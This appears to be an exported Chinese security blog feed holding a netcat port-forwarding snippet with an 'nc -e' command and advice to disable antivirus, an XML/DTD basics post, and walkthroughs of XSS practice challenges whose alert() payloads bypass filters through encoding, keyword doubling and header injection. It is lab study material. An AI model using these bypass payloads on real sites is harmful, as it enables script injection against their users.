<h1 id="5-netcat连接转发-端口转发"><a href="#5-netcat连接转发-端口转发" class="headerlink" title="5.netcat连接转发(端口转发)"></a>5.netcat连接转发(端口转发)</h1><p>突破某些特殊情况下的连接限制</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="bullet">-</span> echo nc [<span class="string">target</span>][<span class="symbol">IP</span>]     &gt; delay.bat</span><br><span class="line">delay.bat  nc ip port</span><br><span class="line">-nc -l -p [localport]    -e delay.bat</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/434343f.png"></p>
<h1 id="6-windows下载"><a href="#6-windows下载" class="headerlink" title="6.windows下载"></a>6.windows下载</h1><p><a href="https://eternallybored.org/misc/netcat/">netcat点这</a></p>
<p>windows下选择netcat 1.11，保存即可。关闭杀毒软件或加入白名单，将nc.exe拖入cmd中即可运行netcat。</p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>XML和XXE基础</title>
    <url>/2019/09/29/XML%E5%92%8CXXE%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h3 id="XML简介"><a href="#XML简介" class="headerlink" title="XML简介"></a>XML简介</h3><ul>
<li>XML 被设计用来传输和存储数据。</li>
<li>HTML 被设计用来显示数据。<a id="more"></a>
</li>
</ul>
<hr>
<h3 id="XML语法"><a href="#XML语法" class="headerlink" title="XML语法"></a>XML语法</h3><h4 id="所有XML都必须要有关闭标签。"><a href="#所有XML都必须要有关闭标签。" class="headerlink" title="所有XML都必须要有关闭标签。"></a>所有XML都必须要有关闭标签。</h4><figure class="highlight vhdl"><table><tr><td class="code"><pre><span class="line">&lt;<span class="literal">note</span>&gt; this<span class="symbol">&#x27;s</span> <span class="literal">note</span> example &lt;/<span class="literal">note</span>&gt;</span><br></pre></td></tr></table></figure>
<h4 id="所有XML的标签对大小写敏感"><a href="#所有XML的标签对大小写敏感" class="headerlink" title="所有XML的标签对大小写敏感"></a>所有XML的标签对大小写敏感</h4><p>XML 标签对大小写敏感。在 XML 中，标签 <Letter> 与标签 <letter> 是不同的。<br>必须使用相同的大小写来编写打开标签和关闭标签</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Message</span>&gt;</span>这是错误的。<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>这是正确的。<span class="tag">&lt;/<span class="name">message</span>&gt;</span> </span><br></pre></td></tr></table></figure>
<h4 id="XML的属性值必须加引号"><a href="#XML的属性值必须加引号" class="headerlink" title="XML的属性值必须加引号"></a>XML的属性值必须加引号</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- wrong example --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span> <span class="attr">data</span>=<span class="string">8/2/16/</span>&gt;</span> <span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- right example --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span> <span class="attr">data</span>=<span class="string">&quot;08/02/16&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="在-XML-中，-5个实体引用来代替符号："><a href="#在-XML-中，-5个实体引用来代替符号：" class="headerlink" title="在 XML 中， 5个实体引用来代替符号："></a>在 XML 中， 5个实体引用来代替符号：</h4><table>
<thead>
<tr>
<th>实体引用</th>
<th>符号</th>
<th>中文解释</th>
</tr>
</thead>
<tbody><tr>
<td>&amp;it</td>
<td>＜</td>
<td>小于号</td>
</tr>
<tr>
<td>&amp;gt</td>
<td>＞</td>
<td>大于号</td>
</tr>
<tr>
<td>&amp;amp</td>
<td>&amp;</td>
<td>和号</td>
</tr>
<tr>
<td>&amp;apos</td>
<td>‘</td>
<td>单引号</td>
</tr>
<tr>
<td>&amp;quot</td>
<td>“</td>
<td>双引号</td>
</tr>
</tbody></table>
<hr>
<h3 id="XML结构"><a href="#XML结构" class="headerlink" title="XML结构"></a>XML结构</h3><pre><code> - XML文档结构包括DTD文档类型定义和文档元素信息。</code></pre>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span>     #第一行是 XML 声明   </span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span>                                          #第二行根元素<span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span>                                 #3-6描述根的4个子元素（to,from,heading以及body）</span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span>                   </span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span>      </span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span>                                         #最后闭合根元素<span class="tag">&lt;<span class="name">note</span>&gt;</span>结束      </span><br></pre></td></tr></table></figure>
<ul>
<li><p>XML DTD</p>
<p>  DTD全称是The document type definition，即是文档类型定义，可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p>
</li>
</ul>
<p>假如 DTD 被包含在您的 XML 源文件中，它应当通过下面的语法包装在一个 DOCTYPE 声明中：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span> (<span class="meta-keyword">to</span>,<span class="meta-keyword">from</span>,<span class="meta-keyword">heading</span>,<span class="meta-keyword">body</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">from</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">heading</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">body</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget me this weekend<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>DTD 位于 XML 源文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;note.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget me this weekend!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line"></span><br><span class="line">这是包含 DTD 的 &quot;note.dtd&quot; 文件：</span><br><span class="line"><span class="comment">&lt;!-- note.dtd </span></span><br><span class="line"><span class="comment">&lt;!ELEMENT note (to,from,heading,body)&gt;</span></span><br><span class="line"><span class="comment">&lt;!ELEMENT to (#PCDATA)&gt;</span></span><br><span class="line"><span class="comment">&lt;!ELEMENT from (#PCDATA)&gt;</span></span><br><span class="line"><span class="comment">&lt;!ELEMENT heading (#PCDATA)&gt;</span></span><br><span class="line"><span class="comment">&lt;!ELEMENT body (#PCDATA)&gt;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure>
<hr>
<h3 id="DTD中的实体"><a href="#DTD中的实体" class="headerlink" title="DTD中的实体"></a>DTD中的实体</h3><p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量。</p>
<ul>
<li>实体引用是对实体的引用。</li>
<li>实体可在内部或外部进行声明。</li>
</ul>
<h4 id="内部实体声明"><a href="#内部实体声明" class="headerlink" title="内部实体声明"></a>内部实体声明</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">DTD 实例:</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="meta-keyword">writer</span> <span class="meta-string">&quot;Donald Duck.&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="meta-keyword">copyright</span> <span class="meta-string">&quot;Copyright runoob.com&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">XML 实例：</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span><span class="symbol">&amp;writer;</span><span class="symbol">&amp;copyright;</span><span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="外部实体声明"><a href="#外部实体声明" class="headerlink" title="外部实体声明"></a>外部实体声明</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">DTD 实例:</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="meta-keyword">writer</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://www.runoob.com/entities.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="meta-keyword">copyright</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://www.runoob.com/entities.dtd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">XML example:</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span><span class="symbol">&amp;writer;</span><span class="symbol">&amp;copyright;</span><span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure>



<hr>
]]></content>
      <categories>
        <category>owasp</category>
      </categories>
      <tags>
        <tag>owasp</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS小游戏2</title>
    <url>/2020/02/22/XSS%E5%B0%8F%E6%B8%B8%E6%88%8F2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>你必须非常努力，才能看起来毫不费劲。</p>
<a id="more"></a>

<hr>
<h1 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h1><p><strong>练习地址</strong> </p>
<blockquote>
<p><a href="https://xss.haozi.me/">https://xss.haozi.me/</a></p>
</blockquote>
<p><strong>网站源码</strong></p>
<blockquote>
<p><a href="https://github.com/haozi/xss-demo">https://github.com/haozi/xss-demo</a></p>
</blockquote>
<h1 id="0x00-1"><a href="#0x00-1" class="headerlink" title="0x00"></a>0x00</h1><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> <span class="params">(input)</span></span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&lt;div&gt;&#x27;</span> + <span class="built_in">input</span> + <span class="string">&#x27;&lt;/div&gt;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>无过滤</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><pre><code></code></pre>
]]></content>
      <categories>
        <category>OWASP</category>
      </categories>
      <tags>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>xss挑战 1</title>
    <url>/2020/01/09/Xss%E5%B0%8F%E6%B8%B8%E6%88%8F/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>自己对XSS的理解不深，拿小游戏来练练手正好。</p>
<a id="more"></a>

<hr>
<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>一个xss练习平台，在线地址：<a href="http://test.xss.tv/">http://test.xss.tv/</a></p>
<p><a href="http://www.91ri.org/16155.html">xss用法js总结</a></p>
<p><a href="https://github.com/s0md3v/AwesomeXSS">AwesomeXSS</a></p>
<p>xss的常规思路：</p>
<blockquote>
<p>1.先找注入点</p>
</blockquote>
<blockquote>
<p>2.再找输出点</p>
</blockquote>
<blockquote>
<p>3.根据输出点位置，格式，显示不断重新尝试有效载荷</p>
</blockquote>
<h2 id="LEVEL-1"><a href="#LEVEL-1" class="headerlink" title="LEVEL-1"></a>LEVEL-1</h2><p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200129193723.png"></p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200128204543.png"></p>
<p><strong>payload</strong></p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">http://test.ctf8.com/level1.php?name=%3Cscript%3Ealert(/xss/)%3C/script%<span class="number">3E</span></span><br><span class="line">http://test.ctf8.com/level1.php?name=%3Csvg/onload=alert(<span class="number">1</span>)%<span class="number">3E</span></span><br><span class="line">http://test.ctf8.com/level1.php?name=%3Cimg%20src=<span class="number">1</span>%20onerror=alert(<span class="number">1</span>)%<span class="number">3E</span> </span><br><span class="line">http://test.ctf8.com/level1.php?name=%%3Ca%20href=%22javascript:alert(<span class="number">1</span>)%<span class="number">22</span>%3Etest%3C/a%<span class="number">3E</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200128205930.png"></p>
<h2 id="LEVEL-2"><a href="#LEVEL-2" class="headerlink" title="LEVEL-2"></a>LEVEL-2</h2><p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200129194027.png"></p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200129194222.png"></p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200129194510.png"></p>
<p>显而易见，上面尖括号被过滤了，而下面却没有</p>
<p>PHP中 ‘ 中的变量不会执行    </p>
<p>“中的变量执行。只要闭合双引号即可</p>
<p><strong>payload</strong></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://test.ctf<span class="number">8</span>.com/level<span class="number">2</span>.php?keyword=%<span class="number">22</span>%<span class="number">3</span>E%<span class="number">3</span>Cimg%<span class="number">20</span>src=<span class="number">1</span>%<span class="number">20</span>onerror=alert(<span class="number">1</span>)%<span class="number">3</span>E</span><br><span class="line"><span class="attribute">http</span>://test.ctf<span class="number">8</span>.com/level<span class="number">4</span>.php?keyword=<span class="string">&quot;onclick=&quot;</span>window.alert()</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200129195306.png"></p>
<h2 id="LEVEL-3"><a href="#LEVEL-3" class="headerlink" title="LEVEL-3"></a>LEVEL-3</h2><p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200129195741.png"></p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200129200404.png"></p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">htmlspecialchars</span><span class="params">()</span></span> 函数把预定义的字符转换为 HTML 实体。</span><br><span class="line"></span><br><span class="line">预定义的字符是：</span><br><span class="line"></span><br><span class="line">&amp; （和号）成为 &amp;</span><br><span class="line"><span class="string">&quot; （双引号）成为 &quot;</span></span><br><span class="line"><span class="string">&#x27; （单引号）成为 &#x27;</span></span><br><span class="line">&lt; （小于）成为 &lt;</span><br><span class="line">&gt; （大于）成为 &gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>payload</strong></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://test.ctf<span class="number">8</span>.com/level<span class="number">3</span>.php?keyword=%<span class="number">27</span>onclick%<span class="number">3</span>D%<span class="number">27</span>window.alert%<span class="number">28</span>%<span class="number">29</span>&amp;submit=%E<span class="number">6</span>%<span class="number">90</span>%<span class="number">9</span>C%E<span class="number">7</span>%B<span class="number">4</span>%A<span class="number">2</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200129200650.png"></p>
<h2 id="LEVEL-4"><a href="#LEVEL-4" class="headerlink" title="LEVEL-4"></a>LEVEL-4</h2><p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200129203245.png"></p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200129203703.png"></p>
<p><strong>payload</strong></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://test.ctf<span class="number">8</span>.com/level<span class="number">4</span>.php?keyword=%<span class="number">22</span>onmouseover=%<span class="number">22</span>alert(<span class="number">1</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200129204617.png"></p>
<h2 id="LEVEL-5"><a href="#LEVEL-5" class="headerlink" title="LEVEL-5"></a>LEVEL-5</h2><p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200129204718.png"></p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200129205122.png"></p>
<p>但是这串代码没有过滤&lt;字符和&gt;字符，那么我们可以使用标签的href属性构造payload进行弹窗<br><strong>payload</strong></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://test.ctf<span class="number">8</span>.com/level<span class="number">5</span>.php?keyword=%<span class="number">22</span>%<span class="number">3</span>E%<span class="number">20</span>%<span class="number">3</span>Ca%<span class="number">20</span>href=%<span class="number">22</span>javascript:alert(<span class="number">1</span>)%<span class="number">22</span>%<span class="number">3</span>Exss%<span class="number">3</span>C/a%<span class="number">3</span>E</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200129205546.png"></p>
<h2 id="LEVEL-6"><a href="#LEVEL-6" class="headerlink" title="LEVEL-6"></a>LEVEL-6</h2><p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200129205709.png"><br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200129205902.png"></p>
<p><strong>payload</strong></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://test.ctf<span class="number">8</span>.com/level<span class="number">6</span>.php?keyword=%<span class="number">22</span>ONclick%<span class="number">3</span>D%<span class="number">22</span>window.alert%<span class="number">28</span>%<span class="number">29</span>&amp;submit=%E<span class="number">6</span>%<span class="number">90</span>%<span class="number">9</span>C%E<span class="number">7</span>%B<span class="number">4</span>%A<span class="number">2</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200129210306.png"></p>
<h2 id="LEVEL-7"><a href="#LEVEL-7" class="headerlink" title="LEVEL-7"></a>LEVEL-7</h2><p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200129210608.png"><br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200129210734.png"></p>
<p><strong>payload</strong></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://test.ctf<span class="number">8</span>.com/level<span class="number">7</span>.php?keyword=%<span class="number">22</span>%<span class="number">3</span>E%<span class="number">3</span>CScrscriptipt%<span class="number">3</span>Ealert(<span class="number">1</span>)%<span class="number">3</span>C/Scriscriptpt%<span class="number">3</span>E</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200129211102.png"></p>
<h2 id="LEVEL-8"><a href="#LEVEL-8" class="headerlink" title="LEVEL-8"></a>LEVEL-8</h2><p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200129211209.png"><br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200129211745.png"></p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">Javascript：伪协议后面可以使用<span class="built_in">URL</span>编码。</span><br><span class="line">        如：&lt;<span class="keyword">a</span> href=<span class="string">&quot;javascript:%61lert(1)&quot;</span>&gt;click me&lt;/<span class="keyword">a</span>&gt;可成功执行弹窗。</span><br><span class="line">        可用img就不行:&lt;img src=<span class="number">1</span> onerror=<span class="string">&quot;javascript:%61lert(1)&quot;</span>&gt;</span><br><span class="line">        因为href属性会跳转到其中的<span class="built_in">URL</span>，而会进行<span class="built_in">URL</span>解码，onerror属性只会执行JS,不跳转同时后面的url编码可以再做一次entity(HTML实体)编码：</span><br><span class="line">        &lt;<span class="keyword">a</span> href=<span class="string">&quot;javascript:%61lert(1)&quot;</span>&gt;click me&lt;/<span class="keyword">a</span>&gt;</span><br></pre></td></tr></table></figure>

<p><strong>payload</strong></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://test.ctf<span class="number">8</span>.com/level<span class="number">8</span>.php?keyword=javascri%<span class="number">26</span>%<span class="number">23</span>x<span class="number">0070</span>%<span class="number">3</span>Bt%<span class="number">3</span>Aalert%<span class="number">28</span>%<span class="number">29</span>&amp;submit=%E<span class="number">6</span>%B<span class="number">7</span>%BB%E<span class="number">5</span>%<span class="number">8</span>A%A<span class="number">0</span>%E<span class="number">5</span>%<span class="number">8</span>F%<span class="number">8</span>B%E<span class="number">6</span>%<span class="number">83</span>%<span class="number">85</span>%E<span class="number">9</span>%<span class="number">93</span>%BE%E<span class="number">6</span>%<span class="number">8</span>E%A<span class="number">5</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200130202447.png"></p>
<h2 id="LEVEL-9"><a href="#LEVEL-9" class="headerlink" title="LEVEL-9"></a>LEVEL-9</h2><p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200130202539.png"></p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200130204424.png"></p>
<p>只要让它检测到http，却不能起到作用就可以了，所以可以用注释</p>
<p><strong>payload</strong></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://test.ctf<span class="number">8</span>.com/level<span class="number">9</span>.php?keyword=javascri%<span class="number">26</span>%<span class="number">23</span>x<span class="number">0070</span>%<span class="number">3</span>Bt%<span class="number">3</span>Aalert%<span class="number">281</span>%<span class="number">29</span>%<span class="number">2</span>F*http%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>Fwww.baidu.com*%<span class="number">2</span>F&amp;submit=%E<span class="number">6</span>%B<span class="number">7</span>%BB%E<span class="number">5</span>%<span class="number">8</span>A%A<span class="number">0</span>%E<span class="number">5</span>%<span class="number">8</span>F%<span class="number">8</span>B%E<span class="number">6</span>%<span class="number">83</span>%<span class="number">85</span>%E<span class="number">9</span>%<span class="number">93</span>%BE%E<span class="number">6</span>%<span class="number">8</span>E%A<span class="number">5</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200130204631.png"></p>
<h2 id="LEVEL-10"><a href="#LEVEL-10" class="headerlink" title="LEVEL-10"></a>LEVEL-10</h2><p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200130204732.png"></p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200130210218.png"></p>
<p><strong>payload</strong></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://test.ctf<span class="number">8</span>.com/level<span class="number">10</span>.php?keyword%<span class="number">20</span>=%<span class="number">20</span>test&amp;t_sort=%<span class="number">22</span>type=%<span class="number">22</span>text%<span class="number">22</span>%<span class="number">20</span>onclick%<span class="number">20</span>=%<span class="number">20</span>%<span class="number">22</span>alert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200130210404.png"></p>
<h2 id="LEVEL-11"><a href="#LEVEL-11" class="headerlink" title="LEVEL-11"></a>LEVEL-11</h2><p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200130210444.png"></p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200131122735.png"></p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200131123409.png"></p>
<p><strong>payload</strong></p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Referer</span>: <span class="string">&quot;onclick=alert(1) type=&quot;</span>text&quot;  <span class="comment">//所添加的Referer头部</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200131123037.png"></p>
<h2 id="LEVEL-12"><a href="#LEVEL-12" class="headerlink" title="LEVEL-12"></a>LEVEL-12</h2><p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200131123731.png"></p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200131124146.png"></p>
<p><strong>payload</strong></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Mozilla</span>/<span class="number">5</span>.<span class="number">0</span> (Windows NT <span class="number">10</span>.<span class="number">0</span>; Win<span class="number">64</span>; x<span class="number">64</span>; rv:<span class="number">70</span>.<span class="number">0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">70</span>.<span class="number">0</span> <span class="string">&quot; onclick=alert(1) type=&quot;</span>text</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200131124432.png"></p>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200131124015.png"></p>
<h2 id="LEVEL-13"><a href="#LEVEL-13" class="headerlink" title="LEVEL-13"></a>LEVEL-13</h2><p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200131124601.png"><br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200131124751.png"><br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200131125700.png"></p>
<p><strong>payload</strong></p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">user</span>=<span class="keyword">call</span>+me+maybe%<span class="number">3</span>F &quot; onclick=alert(1) type=&quot;<span class="type">text</span>&quot;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200131125452.png"></p>
<h2 id="LEVEL-14"><a href="#LEVEL-14" class="headerlink" title="LEVEL-14"></a>LEVEL-14</h2><p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200131125810.png"><br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200131130951.png"><br>查看源码，点击<br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200131131050.png"></p>
<p>这关目前做不了，我再看看</p>
<h2 id="LEVEL-15"><a href="#LEVEL-15" class="headerlink" title="LEVEL-15"></a>LEVEL-15</h2><p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200131135344.png"><br><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200131140912.png"><br><strong>payload</strong></p>
